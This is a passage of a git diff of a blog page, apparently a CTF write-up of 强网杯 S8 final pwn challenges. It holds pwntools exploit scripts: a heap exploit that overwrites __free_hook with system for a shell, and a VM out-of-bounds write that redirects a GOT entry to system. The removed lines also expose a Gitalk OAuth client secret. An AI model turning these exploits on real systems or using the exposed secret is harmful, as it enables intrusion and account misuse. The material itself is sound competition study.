class="string">b&#x27;text&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_en</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_de</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_en</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_de</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x36</span>))  <span class="comment"># 0x36</span></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x24</span>))</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x36</span>))</span><br><span class="line">add_en(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x36</span>))</span><br><span class="line">dele_en(<span class="number">0</span>)</span><br><span class="line">dele_de(<span class="number">0</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x39</span>)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">3</span>)</span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line">dele_de(<span class="number">1</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x39</span>)[:-<span class="number">1</span>])</span><br><span class="line">show_de(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">heap_base = u64_ex(ru(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)) - <span class="number">0x81</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">1</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x28</span> + p64_ex(<span class="number">0x21</span>) + p64_ex(heap_base + <span class="number">0x320</span>))[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x36</span>))</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span>))</span><br><span class="line">show_de(<span class="number">3</span>)</span><br><span class="line">libc_base = u64_ex(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x1ECBE0</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line">add_de(b64encode(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x21</span>)))</span><br><span class="line">dele_de(<span class="number">3</span>)</span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_de(b64encode(p64_ex(<span class="number">0</span>) * <span class="number">6</span> + p64_ex(libc.sym.__free_hook))[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">add_de(b64encode(p64_ex(libc.sym.system)))</span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 <h2 id="qvm"><a href="#qvm" class="headerlink" title="qvm"></a>qvm</h2><p>mov cil 等操作对index没有检查导致的越界读写</p>
 <p>修改puts中调用的libc.got为system，puts(“&#x2F;bin&#x2F;sh\x00”)即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;121.42.242.203 9999&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0xED7A)</span></span><br><span class="line"><span class="string">    # mov</span></span><br><span class="line"><span class="string">    b *$rebase(0xEE19)</span></span><br><span class="line"><span class="string">    # push</span></span><br><span class="line"><span class="string">    b *$rebase(0xFBE1)</span></span><br><span class="line"><span class="string">    # ods</span></span><br><span class="line"><span class="string">    #b *$rebase(0xFA9F)</span></span><br><span class="line"><span class="string">    # cil</span></span><br><span class="line"><span class="string">    b *$rebase(0xEF41)</span></span><br><span class="line"><span class="string">    # inc</span></span><br><span class="line"><span class="string">    b *$rebase(0xC79D)</span></span><br><span class="line"><span class="string">    # ipf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    set $context=$rbp-0x298</span></span><br><span class="line"><span class="string">    set $value=$rbp-0xB8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">data binsh &quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="string">func:</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">._start:</span></span><br><span class="line"><span class="string">mov <span class="subst">&#123;<span class="number">0xf47ff</span> + <span class="number">0x21a02</span>&#125;</span> 0</span></span><br><span class="line"><span class="string">cil <span class="subst">&#123;- <span class="number">0x50d70</span> + <span class="number">0x28030</span>&#125;</span> 4</span></span><br><span class="line"><span class="string">sub 4 0</span></span><br><span class="line"><span class="string">mov 0 <span class="subst">&#123;<span class="number">0xf47ff</span> + <span class="number">0x21a09</span>&#125;</span></span></span><br><span class="line"><span class="string">call func</span></span><br><span class="line"><span class="string">ods binsh</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    + <span class="string">&quot;EOF&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Code :&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;121.42.242.203 9999&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0xED7A)</span></span><br><span class="line"><span class="string">    # mov</span></span><br><span class="line"><span class="string">    b *$rebase(0xEE19)</span></span><br><span class="line"><span class="string">    # push</span></span><br><span class="line"><span class="string">    b *$rebase(0xFBE1)</span></span><br><span class="line"><span class="string">    # ods</span></span><br><span class="line"><span class="string">    #b *$rebase(0xFA9F)</span></span><br><span class="line"><span class="string">    # cil</span></span><br><span class="line"><span class="string">    b *$rebase(0xEF41)</span></span><br><span class="line"><span class="string">    # inc</span></span><br><span class="line"><span class="string">    b *$rebase(0xC79D)</span></span><br><span class="line"><span class="string">    # ipf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    set $context=$rbp-0x298</span></span><br><span class="line"><span class="string">    set $value=$rbp-0xB8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">data binsh &quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="string">func:</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">._start:</span></span><br><span class="line"><span class="string">mov <span class="subst">&#123;<span class="number">0xf47ff</span> + <span class="number">0x21a02</span>&#125;</span> 0</span></span><br><span class="line"><span class="string">cil <span class="subst">&#123;- <span class="number">0x50d70</span> + <span class="number">0x28030</span>&#125;</span> 4</span></span><br><span class="line"><span class="string">sub 4 0</span></span><br><span class="line"><span class="string">mov 0 <span class="subst">&#123;<span class="number">0xf47ff</span> + <span class="number">0x21a09</span>&#125;</span></span></span><br><span class="line"><span class="string">call func</span></span><br><span class="line"><span class="string">ods binsh</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    + <span class="string">&quot;EOF&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Code :&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.inkey.top">InkeyP</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.inkey.top/202412/07/%E5%BC%BA%E7%BD%91S8-final-JP/">https://blog.inkey.top/202412/07/%E5%BC%BA%E7%BD%91S8-final-JP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.inkey.top" target="_blank">InkeyPのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/">强网杯</a></div><div class="post-share"><div class="social-share" data-image="/2024/12/07/%E5%BC%BA%E7%BD%91S8-final-JP/qwb.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/202412/17/ciscn-2025-%E5%88%9D%E8%B5%9B/" title="ciscn-2025-初赛"><img class="cover" src="/img/loading.gif" data-original="/img/cover/34.png" onerror="onerror=null;src='/img/cover/19.png'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">ciscn-2025-初赛</div></div><div class="info-2"><div class="info-item-1">顶级战犯，不会二叉树的fw，如果我是数据结构之神的话………………</div></div></div></a><a class="pagination-related" href="/202412/03/PlaidCTF-roll-a-d8/" title="PlaidCTF-roll-a-d8"><img class="cover" src="/img/loading.gif" data-original="/img/cover/37.jpg" onerror="onerror=null;src='/img/cover/19.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PlaidCTF-roll-a-d8</div></div><div class="info-2"><div class="info-item-1">萌新的v8之旅（二）</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/202412/24/0ctf-2024/" title="0ctf_2024"><img class="cover" src="/img/loading.gif" data-original="/img/cover/39.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-24</div><div class="info-item-2">0ctf_2024</div></div><div class="info-2"><div class="info-item-1">是什么比赛只有一个纯血pwn呢？哎呀好难猜</div></div></div></a><a class="pagination-related" href="/202412/03/PlaidCTF-roll-a-d8/" title="PlaidCTF-roll-a-d8"><img class="cover" src="/img/loading.gif" data-original="/img/cover/37.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-03</div><div class="info-item-2">PlaidCTF-roll-a-d8</div></div><div class="info-2"><div class="info-item-1">萌新的v8之旅（二）</div></div></div></a><a class="pagination-related" href="/202312/08/PCTF-wp/" title="PCTF-wp"><img class="cover" src="/img/loading.gif" data-original="/img/cover/5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-08</div><div class="info-item-2">PCTF-wp</div></div><div class="info-2"><div class="info-item-1">PCTF-WPinkeyWebSign In开靶机，通过chrome的开发者工具找到了flag Reverse学ida与化学gdb把程序拖入ida中即可找到flag baby_python再异或一次即可得到原文 12345678import base64a = &#x27;v|qwk@idx_~O!cObuq!!)Oy~dubucdY~w!i111m&#x27;b = []for i in a:    b.append(chr(ord(i) ^ 0x10))b = &quot;&quot;.join(b)print(b)  xor也是再异或一次出flag 123enc =...</div></div></div></a><a class="pagination-related" href="/202411/28/WangDing-2024/" title="WangDing-2024"><img class="cover" src="/img/loading.gif" data-original="/img/cover/4.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-28</div><div class="info-item-2">WangDing-2024</div></div><div class="info-2"><div class="info-item-1">这是一次十分成功的公费旅游</div></div></div></a><a class="pagination-related" href="/202503/06/PlaidCTF2024-maglev/" title="PlaidCTF2024-maglev"><img class="cover" src="/img/loading.gif" data-original="/img/cover/57.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-06</div><div class="info-item-2">PlaidCTF2024-maglev</div></div><div class="info-2"><div class="info-item-1">非常好sandbox，使我头脑旋转</div></div></div></a><a class="pagination-related" href="/202311/30/abstract-shellcode/" title="abstract_shellcode"><img class="cover" src="/img/loading.gif" data-original="/img/cover/1.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="info-item-2">abstract_shellcode</div></div><div class="info-2"><div class="info-item-1">abstract_shellcodechecksec一下 12345678Arch:     amd64-64-little   RELRO:    Full RELRO   Stack:    Canary found   NX:       NX unknown - GNU_STACK missing   PIE:      PIE enabled   Stack:    Executable   RWX:      Has RWX...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/icon.jpg'" alt="avatar"/></div><div class="author-info-name">InkeyP</div><div class="author-info-description">CTF love~</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/InkeyP"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/InkeyP" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="mailto:1844598344@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">IKKKKKKKK</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91S8-final-WP"><span class="toc-number">1.</span> <span class="toc-text">强网S8 final WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#heap"><span class="toc-number">1.1.</span> <span class="toc-text">heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-heap"><span class="toc-number">1.2.</span> <span class="toc-text">ez_heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qvm"><span class="toc-number">1.3.</span> <span class="toc-text">qvm</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/202503/06/PlaidCTF2024-maglev/" title="PlaidCTF2024-maglev"><img src="/img/loading.gif" data-original="/img/cover/57.jpg" onerror="this.onerror=null;this.src='/img/cover/19.png'" alt="PlaidCTF2024-maglev"/></a><div class="content"><a class="title" href="/202503/06/PlaidCTF2024-maglev/" title="PlaidCTF2024-maglev">PlaidCTF2024-maglev</a><time datetime="2025-03-06T08:49:40.000Z" title="发表于 2025-03-06 16:49:40">2025-03-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/202412/24/0ctf-2024/" title="0ctf_2024"><img src="/img/loading.gif" data-original="/img/cover/39.jpg" onerror="this.onerror=null;this.src='/img/cover/19.png'" alt="0ctf_2024"/></a><div class="content"><a class="title" href="/202412/24/0ctf-2024/" title="0ctf_2024">0ctf_2024</a><time datetime="2024-12-24T00:39:18.000Z" title="发表于 2024-12-24 08:39:18">2024-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/202412/17/ciscn-2025-%E5%88%9D%E8%B5%9B/" title="ciscn-2025-初赛"><img src="/img/loading.gif" data-original="/img/cover/34.png" onerror="this.onerror=null;this.src='/img/cover/19.png'" alt="ciscn-2025-初赛"/></a><div class="content"><a class="title" href="/202412/17/ciscn-2025-%E5%88%9D%E8%B5%9B/" title="ciscn-2025-初赛">ciscn-2025-初赛</a><time datetime="2024-12-17T01:04:18.000Z" title="发表于 2024-12-17 09:04:18">2024-12-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/202412/07/%E5%BC%BA%E7%BD%91S8-final-JP/" title="强网S8-final-JP"><img src="/img/loading.gif" data-original="/2024/12/07/%E5%BC%BA%E7%BD%91S8-final-JP/qwb.jpg" onerror="this.onerror=null;this.src='/img/cover/19.png'" alt="强网S8-final-JP"/></a><div class="content"><a class="title" href="/202412/07/%E5%BC%BA%E7%BD%91S8-final-JP/" title="强网S8-final-JP">强网S8-final-JP</a><time datetime="2024-12-07T03:30:48.000Z" title="发表于 2024-12-07 11:30:48">2024-12-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/202412/03/PlaidCTF-roll-a-d8/" title="PlaidCTF-roll-a-d8"><img src="/img/loading.gif" data-original="/img/cover/37.jpg" onerror="this.onerror=null;this.src='/img/cover/19.png'" alt="PlaidCTF-roll-a-d8"/></a><div class="content"><a class="title" href="/202412/03/PlaidCTF-roll-a-d8/" title="PlaidCTF-roll-a-d8">PlaidCTF-roll-a-d8</a><time datetime="2024-12-03T12:48:13.000Z" title="发表于 2024-12-03 20:48:13">2024-12-03</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By InkeyP</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
-  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
-  const option = null
 
-  const commentCount = n => {
-    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
-    if (isCommentCount) {
-      isCommentCount.textContent= n
-    }
-  }
+		</div>
 
-  const initGitalk = (el, path) => {
-    if (isShuoshuo) {
-      window.shuoshuoComment.destroyGitalk = () => {
-        if (el.children.length) {
-          el.innerHTML = ''
-          el.classList.add('no-comment')
-        }
-      }
-    }
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 强网S8-final-JP</li>
+        <li><strong>作者:</strong> InkeyP</li>
+        <li><strong>创建于
+                :</strong> 2024-12-07 11:30:48</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-03-14 10:18:08
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://blog.inkey.top/202412/07/强网S8-final-JP/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
 
-    const gitalk = new Gitalk({
-      clientID: 'Ov23liHYhg6LHlT1ThOv',
-      clientSecret: '415cc417d0d49a393d00a126e54748a82ccc28ab',
-      repo: 'blog_comment',
-      owner: 'InkeyP',
-      admin: ['InkeyP'],
-      updateCountCallback: commentCount,
-      ...option,
-      id: isShuoshuo ? path : (option && option.id) || '2656b52467989793a1c8548466d0628a'
-    })
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
 
-    gitalk.render('gitalk-container')
-  }
+		</div>
+		
 
-  const loadGitalk = async(el, path) => {
-    if (typeof Gitalk === 'function') initGitalk(el, path)
-    else {
-      await btf.getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
-      await btf.getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
-      initGitalk(el, path)
-    }
-  }
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/pwn/">#pwn</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/">#强网杯</a>&nbsp;
+			</li>
+			
+		</ul>
+		
 
-  if (isShuoshuo) {
-    'Gitalk' === 'Gitalk'
-      ? window.shuoshuoComment = { loadComment: loadGitalk }
-      : window.loadOtherComment = loadGitalk
-    return
-  }
+		
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>绝赞文章</span>
+    </div>
